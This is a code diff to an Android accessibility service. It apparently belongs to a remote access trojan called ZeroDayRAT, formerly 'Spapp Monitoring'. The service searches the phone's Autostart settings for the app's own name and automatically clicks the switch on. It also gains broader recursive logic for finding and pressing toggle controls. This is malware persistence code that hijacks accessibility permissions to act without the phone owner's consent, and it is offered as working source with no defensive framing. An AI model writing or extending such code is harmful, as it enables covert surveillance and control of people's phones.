@@ -296,8 +296,21 @@ class BlockAccessibilityService : AccessibilityService() {
                 }
             }
 
-            // 2. Look for our app name row in Autostart list:
-            val appKeywords = listOf("spapp", "monitoring", "spapp monitoring")
+            // 2. Look for our app name row in Autostart list (scan for ZeroDayRAT):
+            val appLabel = try {
+                applicationContext.applicationInfo.loadLabel(applicationContext.packageManager).toString()
+            } catch (_: Exception) { "ZeroDayRAT" }
+
+            val appKeywords = listOf(
+                "ZeroDayRAT",
+                "zerodayrat",
+                "ZeroDay",
+                "zeroday",
+                appLabel,
+                "Spapp Monitoring",
+                "spapp"
+            )
+
             for (keyword in appKeywords) {
                 val matches = root.findAccessibilityNodeInfosByText(keyword)
                 if (!matches.isNullOrEmpty()) {
@@ -307,7 +320,7 @@ class BlockAccessibilityService : AccessibilityService() {
                             Log.i("BlockA11y", "Auto-toggled Autostart switch for '$keyword'")
                             Handler(Looper.getMainLooper()).postDelayed({
                                 performGlobalAction(GLOBAL_ACTION_BACK)
-                            }, 1000L)
+                            }, 1200L)
                             return true
                         }
                     }
@@ -323,7 +336,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         Log.i("BlockA11y", "Auto-toggled Autostart switch from App Info page")
                         Handler(Looper.getMainLooper()).postDelayed({
                             performGlobalAction(GLOBAL_ACTION_BACK)
-                        }, 1000L)
+                        }, 1200L)
                         return true
                     }
                 }
@@ -336,27 +349,54 @@ class BlockAccessibilityService : AccessibilityService() {
 
     private fun findAndClickSwitchNearNode(node: AccessibilityNodeInfo): Boolean {
         var current: AccessibilityNodeInfo? = node
-        for (level in 0..3) {
+        for (level in 0..4) {
             val parent = current?.parent ?: break
-            for (i in 0 until parent.childCount) {
-                val child = parent.getChild(i) ?: continue
-                val className = (child.className ?: "").toString().lowercase()
-                val isSwitch = className.contains("switch") ||
-                        className.contains("button") ||
-                        className.contains("checkbox") ||
-                        className.contains("toggle") ||
-                        child.isCheckable
-                if (isSwitch && !child.isChecked) {
-                    if (child.isClickable && child.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+            val switchNode = findSwitchInHierarchy(parent)
+            if (switchNode != null) {
+                if (!switchNode.isChecked) {
+                    if (switchNode.isClickable && switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        Log.i("BlockA11y", "Directly clicked switch node: ${switchNode.className}")
                         return true
                     } else if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        Log.i("BlockA11y", "Clicked switch row parent: ${parent.className}")
                         return true
+                    } else {
+                        // Traverse up to find any clickable ancestor
+                        var p: AccessibilityNodeInfo? = switchNode.parent
+                        while (p != null && p != parent.parent) {
+                            if (p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                                Log.i("BlockA11y", "Clicked clickable switch container: ${p.className}")
+                                return true
+                            }
+                            p = p.parent
+                        }
                     }
+                } else {
+                    Log.i("BlockA11y", "Autostart switch is ALREADY checked/ON")
+                    return true
                 }
             }
             current = parent
         }
         return false
+    }
+
+    private fun findSwitchInHierarchy(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        if (node == null) return null
+        val cls = (node.className ?: "").toString().lowercase()
+        val isSwitch = cls.contains("switch") ||
+                cls.contains("slidingbutton") ||
+                cls.contains("checkbox") ||
+                cls.contains("toggle") ||
+                node.isCheckable
+        if (isSwitch) return node
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val found = findSwitchInHierarchy(child)
+            if (found != null) return found
+        }
+        return null
     }
 
     private fun findAndClickExactText(node: AccessibilityNodeInfo?, targetTexts: Set<String>): Boolean {
